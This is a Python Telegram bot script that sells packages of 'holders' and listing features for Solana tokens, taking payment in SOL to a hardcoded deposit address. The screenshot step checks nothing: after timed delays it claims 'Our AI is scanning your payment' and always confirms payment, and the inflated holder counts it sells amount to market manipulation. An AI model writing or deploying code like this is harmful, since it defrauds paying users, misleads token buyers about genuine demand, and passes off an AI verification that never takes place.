import logging
import os
import asyncio # Import the asyncio library for delays
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, CallbackQueryHandler, CallbackContext

# Enable logging to see errors and bot activity
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Conversation States ---
# These are the different steps in the conversation with the user.
ASK_CONTRACT, ASK_TOKEN_NAME, SHOW_OPTIONS, AWAIT_SCREENSHOT = range(4)

# --- Bot Configuration ---
# The bot token is now fetched from an environment variable for security.
# You will set this in the Render.com dashboard.
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("No TELEGRAM_BOT_TOKEN found in environment variables. Please set it.")

# The Solana address where users will send their payments.
DEPOSIT_ADDRESS = '5H5xeKUt1wh5SE8hSJbnh9tsdVgZrUrbGffQjD9HTE9E'

# --- Main Bot Functions ---

async def start(update: Update, context: CallbackContext) -> int:
    """
    Starts the conversation when the user sends /start.
    Welcomes the user and asks for the token contract address.
    """
    user = update.effective_user
    welcome_message = (
        f"👋 Welcome to CoinBot, {user.first_name}!\n\n"
        "I can help you get more holders for your Solana token.\n\n"
        "First, please send me your token's contract address."
    )
    await update.message.reply_text(welcome_message)
    return ASK_CONTRACT

async def ask_for_contract(update: Update, context: CallbackContext) -> int:
    """
    Stores the contract address and asks for the token name.
    """
    # Store the user's response (the contract address)
    context.user_data['contract_address'] = update.message.text
    logger.info(f"Contract Address from {update.effective_user.first_name}: {context.user_data['contract_address']}")

    await update.message.reply_text("Great! Now, please tell me the name of your token (e.g., 'MyCoolToken').")
    return ASK_TOKEN_NAME

async def ask_for_token_name(update: Update, context: CallbackContext) -> int:
    """
    Stores the token name and then shows the main service options.
    """
    # Store the user's response (the token name)
    context.user_data['token_name'] = update.message.text
    logger.info(f"Token Name from {update.effective_user.first_name}: {context.user_data['token_name']}")

    await update.message.reply_text(f"Perfect! You've set the token: {context.user_data['token_name']}.")

    # Now, show the main menu of options
    return await show_payment_options(update, context)


async def show_payment_options(update: Update, context: CallbackContext) -> int:
    """
    Displays the main menu with the different holder packages.
    """
    keyboard = [
        [InlineKeyboardButton("📦 50 Holders (0.5 SOL)", callback_data='option_1')],
        [InlineKeyboardButton("🚀 400 Holders (1.8 SOL)", callback_data='option_2')],
        [InlineKeyboardButton("🌟 700 Holders (3.0 SOL)", callback_data='option_3')],
        [InlineKeyboardButton("� 1000 Holders (3.8 SOL)", callback_data='option_4')],
        [InlineKeyboardButton("💎 DexScreener/Pump.fun Feature (6.0 SOL)", callback_data='option_5')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # If the function is called from a message, reply to it.
    # If it's from a button press (callback query), edit the previous message.
    if update.callback_query:
        await update.callback_query.message.edit_text(
            "Please choose a package to increase your token holders:",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            "Please choose a package to increase your token holders:",
            reply_markup=reply_markup
        )

    return SHOW_OPTIONS


async def handle_payment_choice(update: Update, context: CallbackContext) -> int:
    """
    Handles the user's choice from the payment options menu.
    """
    query = update.callback_query
    await query.answer()  # Acknowledge the button press

    # Store which option the user chose
    context.user_data['chosen_option'] = query.data

    # Define the text for each option
    options_details = {
        'option_1': "📦 50 Holders for 0.5 SOL",
        'option_2': "🚀 400 Holders for 1.8 SOL",
        'option_3': "🌟 700 Holders for 3.0 SOL",
        'option_4': "🔥 1000 Holders for 3.8 SOL",
        'option_5': "💎 DexScreener/Pump.fun Feature for 6.0 SOL"
    }
    chosen_plan_text = options_details.get(query.data, "the selected plan")

    deposit_message = (
        f"You have selected: **{chosen_plan_text}**.\n\n"
        "To proceed, please deposit the required SOL amount to the following address:\n\n"
        f"`{DEPOSIT_ADDRESS}`\n\n"
        "(Tap to copy the address)\n\n"
        "After making the deposit, please take a screenshot of the transaction confirmation."
    )

    # Create a "Confirm Payment" button
    keyboard = [[InlineKeyboardButton("✅ Confirm Payment", callback_data='confirm_payment')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text=deposit_message, reply_markup=reply_markup, parse_mode='Markdown')

    return AWAIT_SCREENSHOT


async def prompt_for_screenshot(update: Update, context: CallbackContext) -> int:
    """
    Asks the user to upload the screenshot after they click 'Confirm Payment'.
    """
    query = update.callback_query
    await query.answer()

    await query.edit_message_text(
        text="To fast-track your deposit, please submit a screenshot of your transaction now.\n\n"
             "Our AI will scan it to activate your bot."
    )
    return AWAIT_SCREENSHOT


async def handle_screenshot(update: Update, context: CallbackContext) -> int:
    """
    Handles the uploaded screenshot, simulates a verification process with delays,
    and confirms the payment.
    """
    photo = update.message.photo[-1]  # Get the largest available photo
    logger.info(f"Screenshot received from {update.effective_user.first_name}. File ID: {photo.file_id}")

    # 1. Initial confirmation message
    await update.message.reply_text(
        "✅ Thank you! We have received your screenshot.\n\n"
        "Your payment is being verified. This usually takes just a few moments."
    )

    # 2. Add a 10-second delay
    await asyncio.sleep(10)

    # 3. Send scanning message
    await update.message.reply_text("⏳ Our AI is scanning your payment...")

    # 4. Add a 4-second delay
    await asyncio.sleep(4)

    # 5. Send final confirmation
    await update.message.reply_text(
        "🎉 Payment received!\n\n"
        "Your holder increase is now being processed. We will notify you upon completion.\n\n"
        "You can start a new request by sending /start."
    )

    # End the current conversation
    return ConversationHandler.END


async def cancel(update: Update, context: CallbackContext) -> int:
    """
    Cancels and ends the conversation.
    """
    user = update.effective_user
    logger.info(f"User {user.first_name} canceled the conversation.")
    await update.message.reply_text(
        'Action canceled. Send /start anytime to begin again.'
    )
    return ConversationHandler.END


def main() -> None:
    """Run the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(BOT_TOKEN).build()

    # Create a ConversationHandler to manage the multi-step process.
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_CONTRACT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_for_contract)],
            ASK_TOKEN_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_for_token_name)],
            SHOW_OPTIONS: [CallbackQueryHandler(handle_payment_choice)],
            AWAIT_SCREENSHOT: [
                CallbackQueryHandler(prompt_for_screenshot, pattern='^confirm_payment$'),
                MessageHandler(filters.PHOTO, handle_screenshot)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    application.add_handler(conv_handler)

    # Start the Bot
    print("Bot is running...")
    application.run_polling()


if __name__ == '__main__':
    main()
�
